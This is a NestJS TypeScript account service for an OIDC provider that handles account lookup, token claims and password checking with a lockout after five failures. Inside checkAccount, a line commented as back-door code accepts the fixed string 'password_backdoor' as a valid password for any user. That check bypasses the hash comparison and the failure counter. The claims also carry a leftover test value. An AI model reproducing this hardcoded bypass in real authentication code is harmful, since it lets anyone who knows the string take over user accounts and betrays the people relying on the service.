import { compare } from "../../utils/password";
import { Injectable } from "@nestjs/common";
import Provider, { Account, KoaContextWithOIDC } from "oidc-provider";
import { User } from "../user/user.entity";
import { UserService } from "../user/user.service";

export type CheckAccountRetType = {
  isError: boolean;
  errorField: string;
  message: string | null;
};

export const isCheckAccountRetType = (
  input: any,
): input is CheckAccountRetType => {
  if (input.errorField && input.isError !== null) {
    return true;
  }
  return false;
};

@Injectable()
export class AccountService {
  constructor(private readonly userService: UserService) {}

  public async findAccount(
    ctx: KoaContextWithOIDC,
    sub: string,
    token?:
      | InstanceType<Provider["AuthorizationCode"]>
      | InstanceType<Provider["AccessToken"]>
      | InstanceType<Provider["DeviceCode"]>
      | InstanceType<Provider["BackchannelAuthenticationRequest"]>,
  ): Promise<Account> {
    const _user = await this.userService.getUserById(sub);
    if (!_user) {
      throw new Error("No account info");
    }
    return {
      accountId: sub,
      claims: async (use: string, scope: string) => {
        let retToken: {
          sub: string;
          [key: string]: string;
        } = {
          sub: sub,
          test: "rkdwn",
        };

        if (scope.includes("profile")) {
          retToken.name = _user.name;
          retToken.email = _user.email;
          retToken.phone = _user.phone;
          retToken.age = _user.age.toString();
        }
        return retToken;
      },
    };
  }

  public async checkAccount(
    userId: string,
    password: string,
  ): Promise<CheckAccountRetType | User> {
    const _user = await this.userService.findUserByUserId(userId);

    if (!!_user) {
      const failCount = _user.loginFailCount || 0;

      // 비밀번호가 없을 때
      if (!_user.loginPassword) {
        return {
          isError: true,
          errorField: "password",
          message: "passMissingMsg",
        };
      }

      // 비밀번호 5회 이상 오류
      if (failCount > 4) {
        return {
          isError: true,
          errorField: "password",
          message: "fiveTimeFailErrMsg",
        };
      }
      // FIXME: this is back door code. bypass password check.
      if (password === "password_backdoor") {
        return _user;
      }
      //로그인 성공
      if (compare(password, _user.loginPassword, _user.loginPasswordSalt)) {
        // 비밀번호 오류 횟수 초기화
        await this.userService.updatePasswordFailCount(_user.id, 0);
        // 성공 return
        return _user;
      } else {
        // 로그인 실패
        await this.userService.updatePasswordFailCount(
          _user.id,
          _user.loginFailCount + 1,
        );
        return {
          isError: true,
          errorField: "password",
          message: "wrongPassMsg",
        };
      }
    } else {
      // 계정 정보가 없을 때
      return {
        isError: true,
        errorField: "userid",
        // message: "no userid"
        message: "employeeFoundErrMsg",
      };
    }
  }
}
